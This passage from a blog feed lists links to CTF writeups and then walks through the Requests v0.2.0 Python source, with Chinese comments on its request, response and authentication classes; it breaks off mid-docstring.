<li><a href="https://chybeta.github.io/2017/06/28/SUCTF-2016-pwn400-writeup/">SUCTF-2016-pwn400-writeup</a></li>
</ul>
<h3 id="pwnable-kr"><a href="#pwnable-kr" class="headerlink" title="pwnable.kr"></a>pwnable.kr</h3><ul>
<li><a href="https://chybeta.github.io/2017/08/01/Pwnable-kr-shellshock/">Pwnable.kr:shellshock</a></li>
<li><a href="https://chybeta.github.io/2017/08/01/Pwnable-kr-mistake/">Pwnable.kr:mistake</a></li>
<li><a href="https://chybeta.github.io/2017/06/18/%E2%80%9C%E6%98%A5%E7%A7%8B%E6%9D%AF%E2%80%9Dweb-writeup/">Pwnable.kr:random </a></li>
<li><a href="https://chybeta.github.io/2017/04/08/Pwnable-kr-passcode/">Pwnable.kr:passcode</a></li>
<li><a href="https://chybeta.github.io/2017/04/07/Pwnable-kr-bof/">Pwnable.kr:bof</a></li>
</ul>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><ul>
<li><a href="https://chybeta.github.io/2017/10/07/CSAW-CTF-2017-MISC-writeup/">CSAW CTF 2017-MISC-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/09/11/ASISCTF2017-ASIS-secret-letter-writeup/">ASISCTF2017-ASIS secret letter-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/08/30/Hackit2017-Cypherpunk%E2%80%99s-nightmare-writeup/">Hackit2017-Cypherpunk’s nightmare-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/30/Hackit2017-USB-ducker-writeup/">Hackit2017-USB ducker-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/28/ISG2017-%E8%B5%9B%E5%89%8D%E7%BB%83%E6%89%8B%E9%A2%98%E2%80%94writeup/">ISG2017-赛前练手题—writeup </a></li>
<li><a href="https://chybeta.github.io/2017/08/27/HackCon2017-Steg-writeup/">HackCon2017-Steg-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/08/06/SHACTF-2017-Growing-Up-writeup/">SHACTF-2017-Growing Up-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/08/06/SHACTF-2017-WannaFly-writeup/">SHACTF-2017-WannaFly-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/07/30/BugsBunnyCTF2017-misc-writeup/">BugsBunnyCTF2017-misc-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/07/23/0ctf-2015-Peers-writeup/">0ctf-2015-Peers-writeup</a></li>
<li><a href="https://chybeta.github.io/2017/07/17/XMAN%E9%80%89%E6%8B%94%E8%B5%9B-2017-misc-writeup/">XMAN选拔赛-2017-misc-writeup</a></li>
</ul>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><ul>
<li><a href="https://chybeta.github.io/2017/09/12/ASISCTF2017-Simple-Crypto-writeup/">ASISCTF2017-Simple Crypto-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/07/30/BugsBunnyCTF2017-crypto-writeup/">BugsBunnyCTF2017-crypto-writeup</a></li>
<li><a href="Meenpwn-2017-crypto-writeup">Meenpwn-2017-crypto-writeup</a></li>
</ul>
<h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><ul>
<li><a href="https://chybeta.github.io/2017/09/02/TWCTF-2017-Rev-Rev-Rev-writeup/">TWCTF 2017-Rev Rev Rev-writeup </a></li>
<li><a href="https://chybeta.github.io/2017/07/30/BugsBunnyCTF2017-Reverse-writeup/">BugsBunnyCTF2017-Reverse-writeup</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;一些自己写的文章。&lt;br&gt;
    
    </summary>
    
      <category term="随笔" scheme="http://chybeta.github.io/categories/%E9%9A%8F%E7%AC%94/"/>
    
    
      <category term="web" scheme="http://chybeta.github.io/tags/web/"/>
    
      <category term="pwn" scheme="http://chybeta.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>Requests v0.2.0 源码阅读</title>
    <link href="http://chybeta.github.io/2018/10/13/Requests-v0-2-0-%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/"/>
    <id>http://chybeta.github.io/2018/10/13/Requests-v0-2-0-源码阅读/</id>
    <published>2018-10-12T16:18:30.000Z</published>
    <updated>2018-10-12T16:29:50.534Z</updated>
    
    <content type="html"><![CDATA[<p>Requests v0.2.0 源码阅读</p>
<a id="more"></a>
<h1 id="v0-2-0"><a href="#v0-2-0" class="headerlink" title="v0.2.0"></a>v0.2.0</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git clone https://github.com/requests/requests</div></pre></td></tr></table></figure>
<p>从 <a href="https://github.com/requests/requests/releases?after=v0.3.0" target="_blank" rel="external">https://github.com/requests/requests/releases?after=v0.3.0</a> 知道 v0.2.0 发布时的 commit为 <a href="https://github.com/requests/requests/commit/d2427ecae751a533ddd9026849dd19cfaa3394f4" target="_blank" rel="external">https://github.com/requests/requests/commit/d2427ecae751a533ddd9026849dd19cfaa3394f4</a> 。检出。</p>
<h1 id="项目结构"><a href="#项目结构" class="headerlink" title="项目结构"></a>项目结构</h1><p><img src="https://raw.githubusercontent.com/CHYbeta/chybeta.github.io/master/images/pic/v020/1.jpg" alt=""></p>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">name</th>
<th style="text-align:center">usage</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">docs</td>
<td style="text-align:center">保存文档</td>
</tr>
<tr>
<td style="text-align:center">requests</td>
<td style="text-align:center">保存源代码</td>
</tr>
<tr>
<td style="text-align:center">.gitignore</td>
<td style="text-align:center">略</td>
</tr>
<tr>
<td style="text-align:center">HISTORY.rst</td>
<td style="text-align:center">历史</td>
</tr>
<tr>
<td style="text-align:center">LICENSE</td>
<td style="text-align:center">协议</td>
</tr>
<tr>
<td style="text-align:center">README.rst</td>
<td style="text-align:center">readme</td>
</tr>
<tr>
<td style="text-align:center">setup.py</td>
<td style="text-align:center">安装</td>
</tr>
<tr>
<td style="text-align:center">test_requests.py</td>
<td style="text-align:center">测试</td>
</tr>
</tbody>
</table>
</div>
<h1 id="test-requests-py"><a href="#test-requests-py" class="headerlink" title="test_requests.py"></a>test_requests.py</h1><p><img src="https://raw.githubusercontent.com/CHYbeta/chybeta.github.io/master/images/pic/v020/2.jpg" alt=""></p>
<p>定义如上方法，用于进行功能测试。</p>
<h1 id="requests"><a href="#requests" class="headerlink" title="requests"></a>requests</h1><p>主要关注 <code>core.py</code></p>
<p>UML图：<br><img src="https://raw.githubusercontent.com/CHYbeta/chybeta.github.io/master/images/pic/v020/3.jpg" alt=""></p>
<p><img src="https://raw.githubusercontent.com/CHYbeta/chybeta.github.io/master/images/pic/v020/8.jpg" alt=""></p>
<p>Structure：<br><img src="https://raw.githubusercontent.com/CHYbeta/chybeta.github.io/master/images/pic/v020/4.jpg" alt=""></p>
<p>主要实现四种类：请求基类<code>_Request</code>、请求类<code>Request</code>、响应类<code>Response</code>、认证<code>AuthObject</code>，七种方法：get、post、put、delete和认证相关的方法，四种异常类。</p>
<h2 id="Request-类"><a href="#Request-类" class="headerlink" title="_Request 类"></a>_Request 类</h2><p>对<a href="https://docs.python.org/2/library/urllib2.html#urllib2.Request" target="_blank" rel="external"><code>urllib2.Request</code>对象</a> 的封装，允许对请求方法进行s手动设置。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">_Request</span><span class="params">(urllib2.Request)</span>:</span></div><div class="line">    <span class="string">"""Hidden wrapper around the urllib2.Request object. Allows for manual</span></div><div class="line">    setting of HTTP methods.</div><div class="line">    """</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, url,</span></span></div><div class="line">                    data=None, headers=&#123;&#125;, origin_req_host=None,</div><div class="line">                    unverifiable=False, method=None):</div><div class="line">        urllib2.Request.__init__( self, url, data, headers, origin_req_host,</div><div class="line">                                  unverifiable)</div><div class="line">		<span class="comment"># 设置请求方法</span></div><div class="line">        self.method = method </div><div class="line">	</div><div class="line">	<span class="comment"># 获取请求方法</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_method</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="keyword">if</span> self.method:</div><div class="line">            <span class="keyword">return</span> self.method</div><div class="line"></div><div class="line">        <span class="keyword">return</span> urllib2.Request.get_method(self)</div></pre></td></tr></table></figure></p>
<h2 id="Request-类-1"><a href="#Request-类-1" class="headerlink" title="Request 类"></a>Request 类</h2><p><img src="https://raw.githubusercontent.com/CHYbeta/chybeta.github.io/master/images/pic/v020/5.jpg" alt=""></p>
<p>附上一些私有变量和私有方法：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Request</span><span class="params">(object)</span>:</span></div><div class="line">	<span class="string">"""The :class:`Request` object. It carries out all functionality of</span></div><div class="line">	Requests. Recommended interface is with the Requests functions.</div><div class="line">	</div><div class="line">	"""</div><div class="line">    </div><div class="line">	_METHODS = (<span class="string">'GET'</span>, <span class="string">'HEAD'</span>, <span class="string">'PUT'</span>, <span class="string">'POST'</span>, <span class="string">'DELETE'</span>)</div><div class="line">	</div><div class="line">	<span class="comment"># 初始化信息</span></div><div class="line">	<span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></div><div class="line">		self.url = <span class="keyword">None</span></div><div class="line">		self.headers = dict()</div><div class="line">		self.method = <span class="keyword">None</span></div><div class="line">		self.params = &#123;&#125;</div><div class="line">		self.data = &#123;&#125;</div><div class="line">		self.response = Response()</div><div class="line">		self.auth = <span class="keyword">None</span></div><div class="line">		self.sent = <span class="keyword">False</span></div><div class="line">	</div><div class="line">	<span class="comment"># repr 略过不提</span></div><div class="line">	<span class="function"><span class="keyword">def</span> <span class="title">__repr__</span><span class="params">(self)</span>:</span></div><div class="line">		<span class="keyword">try</span>:</div><div class="line">			repr = <span class="string">'&lt;Request [%s]&gt;'</span> % (self.method)</div><div class="line">		<span class="keyword">except</span>:</div><div class="line">			repr = <span class="string">'&lt;Request object&gt;'</span></div><div class="line">		<span class="keyword">return</span> repr</div><div class="line">	</div><div class="line">	<span class="comment"># 设置method时，会调用 __setattr__ 方法</span></div><div class="line">	<span class="comment"># 检查设置的值 是否在规定的方法 _METHODS 列表中</span></div><div class="line">	<span class="comment"># 若不在，则抛出 InvalidMethod 错误</span></div><div class="line">	<span class="function"><span class="keyword">def</span> <span class="title">__setattr__</span><span class="params">(self, name, value)</span>:</span></div><div class="line">		<span class="keyword">if</span> (name == <span class="string">'method'</span>) <span class="keyword">and</span> (value):</div><div class="line">			<span class="keyword">if</span> <span class="keyword">not</span> value <span class="keyword">in</span> self._METHODS:</div><div class="line">				<span class="keyword">raise</span> InvalidMethod()</div><div class="line">		</div><div class="line">		object.__setattr__(self, name, value)</div><div class="line">	</div><div class="line">	<span class="comment"># 用于检查 url 是否设置</span></div><div class="line">	<span class="comment"># 若无设置，抛出 URLRequired 错误</span></div><div class="line">	<span class="function"><span class="keyword">def</span> <span class="title">_checks</span><span class="params">(self)</span>:</span></div><div class="line">		<span class="string">"""Deterministic checks for consistiency."""</span></div><div class="line"></div><div class="line">		<span class="keyword">if</span> <span class="keyword">not</span> self.url:</div><div class="line">			<span class="keyword">raise</span> URLRequired</div><div class="line"></div><div class="line">	<span class="comment">#  opener对象</span></div><div class="line">	<span class="function"><span class="keyword">def</span> <span class="title">_get_opener</span><span class="params">(self)</span>:</span></div><div class="line">		<span class="string">""" Creates appropriate opener object for urllib2.</span></div><div class="line">		"""</div><div class="line">		</div><div class="line">		<span class="comment"># 如果需要 认证</span></div><div class="line">		<span class="keyword">if</span> self.auth:</div><div class="line"></div><div class="line">			<span class="comment"># create a password manager</span></div><div class="line">			authr = urllib2.HTTPPasswordMgrWithDefaultRealm()</div><div class="line"></div><div class="line">			authr.add_password(<span class="keyword">None</span>, self.url, self.auth.username, self.auth.password)</div><div class="line">			handler = urllib2.HTTPBasicAuthHandler(authr)</div><div class="line">			opener = urllib2.build_opener(handler)</div><div class="line"></div><div class="line">			<span class="comment"># use the opener to fetch a URL</span></div><div class="line">			<span class="keyword">return</span> opener.open</div><div class="line">		<span class="keyword">else</span>:</div><div class="line">			<span class="comment"># 若无需认证</span></div><div class="line">			<span class="keyword">return</span> urllib2.urlopen</div><div class="line">	</div><div class="line">	。。。</div></pre></td></tr></table></figure></p>
<p>Request类主要用于发送请求，因此重点关注其中的<code>send</code>方法，注释中解释了几点：</p>
<ol>
<li>发送请求，成功返回<code>True</code>，失败返回<code>False</code></li>
<li>如果传输过程中出错，则<code>self.response.status_code</code>会包含错误代码</li>
<li>一旦请求成功发送，则Request类的<code>sent</code>属性会变为<code>True</code></li>
<li><code>anyway</code>参数若被设为True，则请求一定会被发送，不管是否曾发送过，</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">send</span><span class="params">(self, anyway=False)</span>:</span></div><div class="line">	<span class="string">"""Sends the request. Returns True of successfull, false if not.</span></div><div class="line">	    If there was an HTTPError during transmission,</div><div class="line">	    self.response.status_code will contain the HTTPError code.</div><div class="line"></div><div class="line">	    Once a request is successfully sent, `sent` will equal True.</div><div class="line">	</div><div class="line">	    :param anyway: If True, request will be sent, even if it has</div><div class="line">	    already been sent.</div><div class="line">	"""</div><div class="line">	self._checks()</div><div class="line"></div><div class="line">	success = <span class="keyword">False</span></div><div class="line">	</div><div class="line">	<span class="keyword">if</span> self.method <span class="keyword">in</span> (<span class="string">'GET'</span>, <span class="string">'HEAD'</span>, <span class="string">'DELETE'</span>):</div><div class="line">           <span class="comment"># 第一部分 ('GET', 'HEAD', 'DELETE')</span></div><div class="line"></div><div class="line">	<span class="keyword">elif</span> self.method == <span class="string">'PUT'</span>:</div><div class="line">           <span class="comment"># 第二部分 PUT</span></div><div class="line"></div><div class="line">	<span class="keyword">elif</span> self.method == <span class="string">'POST'</span>:</div><div class="line">           <span class="comment"># 第三部分 POST</span></div><div class="line">	</div><div class="line">	self.sent = <span class="keyword">True</span> <span class="keyword">if</span> success <span class="keyword">else</span> <span class="keyword">False</span></div><div class="line">	</div><div class="line">	<span class="keyword">return</span> success</div></pre></td></tr></table></figure>
<p>在send中，会先进行<code>self._checks()</code>检查：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">_checks</span><span class="params">(self)</span>:</span></div><div class="line">	<span class="string">"""Deterministic checks for consistiency."""</span></div><div class="line"></div><div class="line">	<span class="keyword">if</span> <span class="keyword">not</span> self.url:</div><div class="line">		<span class="keyword">raise</span> URLRequired</div></pre></td></tr></table></figure></p>
<p>这里只检测了URL是否设置，若没有则抛出<code>URLRequired</code>错误。然后根据<code>method</code>的不同分情况send请求，如果发送成功则success为True，sent变量也为True，然后返回success变量。</p>
<h3 id="‘GET’-‘HEAD’-‘DELETE’"><a href="#‘GET’-‘HEAD’-‘DELETE’" class="headerlink" title="‘GET’, ‘HEAD’, ‘DELETE’"></a>‘GET’, ‘HEAD’, ‘DELETE’</h3><p>添加注释，代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">send</span><span class="params">(self, anyway=False)</span>:</span></div><div class="line">	。。。</div><div class="line"></div><div class="line">	<span class="keyword">if</span> self.method <span class="keyword">in</span> (<span class="string">'GET'</span>, <span class="string">'HEAD'</span>, <span class="string">'DELETE'</span>):</div><div class="line">		<span class="comment"># 若不曾发送过 或者 不管任何情况</span></div><div class="line">		<span class="keyword">if</span> (<span class="keyword">not</span> self.sent) <span class="keyword">or</span> anyway:   </div><div class="line"></div><div class="line">			<span class="comment"># 如果 params是dict类型的话，进行urlencode</span></div><div class="line">			<span class="comment"># url encode GET params if it's a dict</span></div><div class="line">			<span class="keyword">if</span> isinstance(self.params, dict):</div><div class="line">				params = urllib.urlencode(self.params)</div><div class="line">			<span class="keyword">else</span>:</div><div class="line"></div><div class="line">				params = self.params</div><div class="line"></div><div class="line">			<span class="comment"># 获取 _Request 对象</span></div><div class="line">			<span class="comment"># :param ("%s?%s" % (self.url, params)): 组装url</span></div><div class="line">			<span class="comment"># :param method : 请求方法</span></div><div class="line">			req = _Request((<span class="string">"%s?%s"</span> % (self.url, params)), method=self.method)</div><div class="line"></div><div class="line">			<span class="comment"># 若有设置 headers </span></div><div class="line">			<span class="keyword">if</span> self.headers:</div><div class="line">				req.headers = self.headers</div><div class="line"></div><div class="line">			<span class="comment"># 获取 opener 对象 ，</span></div><div class="line">			opener = self._get_opener()</div><div class="line"></div><div class="line">			<span class="keyword">try</span>:</div><div class="line">				<span class="comment"># 发出请求</span></div><div class="line">				resp = opener(req) </div><div class="line">				<span class="comment"># 状态码</span></div><div class="line">				self.response.status_code = resp.code</div><div class="line">				<span class="comment"># 头部信息</span></div><div class="line">				self.response.headers = resp.info().dict</div><div class="line">				</div><div class="line">				<span class="comment"># 由于在这个判断分支中处理 'GET' 'HEAD', 'DELETE'三种请求</span></div><div class="line">				<span class="comment"># 'HEAD', 'DELETE' 并不是为了获取内容, 他们根据 status_code 即可判断是否请求成功</span></div><div class="line">				<span class="comment"># 若请求方法是 GET , 则设置返回的响应</span></div><div class="line">				<span class="keyword">if</span> self.method.lower() == <span class="string">'get'</span>:</div><div class="line">					<span class="comment">#  设置响应的 content 值</span></div><div class="line">					self.response.content = resp.read()</div><div class="line">					</div><div class="line">				<span class="comment"># 请求成功,设置 success为 True</span></div><div class="line">				success = <span class="keyword">True</span></div><div class="line">			<span class="keyword">except</span> urllib2.HTTPError, why:</div><div class="line">				<span class="comment"># 请求出错, 设置错误码</span></div><div class="line">				self.response.status_code = why.code</div></pre></td></tr></table></figure>
<h3 id="‘PUT’"><a href="#‘PUT’" class="headerlink" title="‘PUT’"></a>‘PUT’</h3><p>添加注释，代码如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">send</span><span class="params">(self, anyway=False)</span>:</span></div><div class="line">	。。。</div><div class="line">	<span class="comment"># 请求方法为 PUT</span></div><div class="line">	<span class="keyword">elif</span> self.method == <span class="string">'PUT'</span>:</div><div class="line">		<span class="keyword">if</span> (<span class="keyword">not</span> self.sent) <span class="keyword">or</span> anyway:</div><div class="line">			<span class="comment"># url 和 请求方法为PUT</span></div><div class="line">			req = _Request(self.url, method=<span class="string">'PUT'</span>)</div><div class="line"></div><div class="line">			<span class="keyword">if</span> self.headers:</div><div class="line">				req.headers = self.headers</div><div class="line"></div><div class="line">			<span class="comment"># 设置PUT请求体</span></div><div class="line">			req.data = self.data</div><div class="line"></div><div class="line">			<span class="keyword">try</span>:</div><div class="line">				opener = self._get_opener()</div><div class="line">				<span class="comment"># 发处请求</span></div><div class="line">				resp =  opener(req)</div><div class="line">				<span class="comment"># 设置响应</span></div><div class="line">				self.response.status_code = resp.code</div><div class="line">				self.response.headers = resp.info().dict</div><div class="line">				self.response.content = resp.read()</div><div class="line"></div><div class="line">				success = <span class="keyword">True</span></div><div class="line"></div><div class="line">			<span class="keyword">except</span> urllib2.HTTPError, why:</div><div class="line">				self.response.status_code = why.code</div></pre></td></tr></table></figure></p>
<h3 id="‘POST’"><a href="#‘POST’" class="headerlink" title="‘POST’"></a>‘POST’</h3><p>添加注释，代码如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">send</span><span class="params">(self, anyway=False)</span>:</span></div><div class="line">	。。。</div><div class="line">	<span class="comment"># 请求方法为 POST</span></div><div class="line">	<span class="keyword">elif</span> self.method == <span class="string">'POST'</span>:</div><div class="line">		<span class="keyword">if</span> (<span class="keyword">not</span> self.sent) <span class="keyword">or</span> anyway</div><div class="line">			</div><div class="line">			<span class="comment"># url 和 请求方法为POST</span></div><div class="line">			req = _Request(self.url, method=<span class="string">'POST'</span>)</div><div class="line"></div><div class="line">			<span class="comment"># 设置 headers</span></div><div class="line">			<span class="keyword">if</span> self.headers:</div><div class="line">				req.headers = self.headers</div><div class="line"></div><div class="line">			<span class="comment"># 如果是dict的话，进行urlencode</span></div><div class="line">			<span class="comment"># url encode form data if it's a dict</span></div><div class="line">			<span class="keyword">if</span> isinstance(self.data, dict):</div><div class="line">				req.data = urllib.urlencode(self.data)</div><div class="line">			<span class="keyword">else</span>:</div><div class="line">				req.data = self.data</div><div class="line"></div><div class="line">			<span class="keyword">try</span>:</div><div class="line">				<span class="comment"># 获取opener</span></div><div class="line">				opener = self._get_opener()</div><div class="line"></div><div class="line">				<span class="comment"># 发出请求</span></div><div class="line">				resp =  opener(req)</div><div class="line">				</div><div class="line">				<span class="comment"># 设置响应</span></div><div class="line">				self.response.status_code = resp.code</div><div class="line">				self.response.headers = resp.info().dict</div><div class="line">				self.response.content = resp.read()</div><div class="line"></div><div class="line">				success = <span class="keyword">True</span></div><div class="line"></div><div class="line">			<span class="keyword">except</span> urllib2.HTTPError, why:</div><div class="line">				self.response.status_code = why.code</div></pre></td></tr></table></figure></p>
<h2 id="Response-类"><a href="#Response-类" class="headerlink" title="Response 类"></a>Response 类</h2><p>在 <code>Request</code>类中我们见到在Request初始化<code>__init__</code>时设置了<code>self.response = Response()</code>。然后根据请求方法的不同，设置状态码<code>self.response.status_code</code>、响应头部<code>self.response.headers</code>、响应内容<code>self.response.content</code> 。接下来就看看<code>response</code>类是如何实现的。</p>
<p><img src="https://raw.githubusercontent.com/CHYbeta/chybeta.github.io/master/images/pic/v020/6.jpg" alt=""></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Response</span><span class="params">(object)</span>:</span></div><div class="line">    <span class="string">"""The :class:`Request` object. All :class:`Request` objects contain a</span></div><div class="line">    :class:`Request.response &lt;response&gt;` attribute, which is an instance of</div><div class="line">    this class.</div><div class="line">    """</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></div><div class="line">        self.content = <span class="keyword">None</span></div><div class="line">        self.status_code = <span class="keyword">None</span></div><div class="line">        self.headers = dict()</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__repr__</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="keyword">try</span>:</div><div class="line">            repr = <span class="string">'&lt;Response [%s]&gt;'</span> % (self.status_code)</div><div class="line">        <span class="keyword">except</span>:</div><div class="line">            repr = <span class="string">'&lt;Response object&gt;'</span></div><div class="line">        <span class="keyword">return</span> repr</div></pre></td></tr></table></figure>
<h2 id="AuthObject-类"><a href="#AuthObject-类" class="headerlink" title="AuthObject 类"></a>AuthObject 类</h2><p>该类暂时仅在 <code>test_requests.py</code> 中出现，用于设置认证的用户名和密码。代码如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">AuthObject</span><span class="params">(object)</span>:</span></div><div class="line">    <span class="string">"""The :class:`AuthObject` is a simple HTTP Authentication token. When</span></div><div class="line">    given to a Requests function, it enables Basic HTTP Authentication for that</div><div class="line">    Request. You can also enable Authorization for domain realms with AutoAuth.</div><div class="line">    See AutoAuth for more details.s</div><div class="line"></div><div class="line">    :param username: Username to authenticate with.</div><div class="line">    :param password: Password for given username.</div><div class="line">    """</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, username, password)</span>:</span></div><div class="line">        self.username = username</div><div class="line">        self.password = password</div></pre></td></tr></table></figure></p>
<h2 id="请求方法"><a href="#请求方法" class="headerlink" title="请求方法"></a>请求方法</h2><p>get、post、put、delete和认证相关的方法 ，在代码结构上大同小异。</p>
<h3 id="get"><a href="#get" class="headerlink" title="get"></a>get</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(url, params=&#123;&#125;, headers=&#123;&#125;, auth=None)</span>:</span></div><div class="line">    <span class="string">"""Sends a GET request. Returns :class:`Response` object.</span></div><div class="line"></div><div class="line">    :param url: URL for the new :class:`Request` object.</div><div class="line">    :param params: (optional) Dictionary of GET Parameters to send with the :class:`Request`.</div><div class="line">    :param headers: (optional) Dictionary of HTTP Headers to sent with the 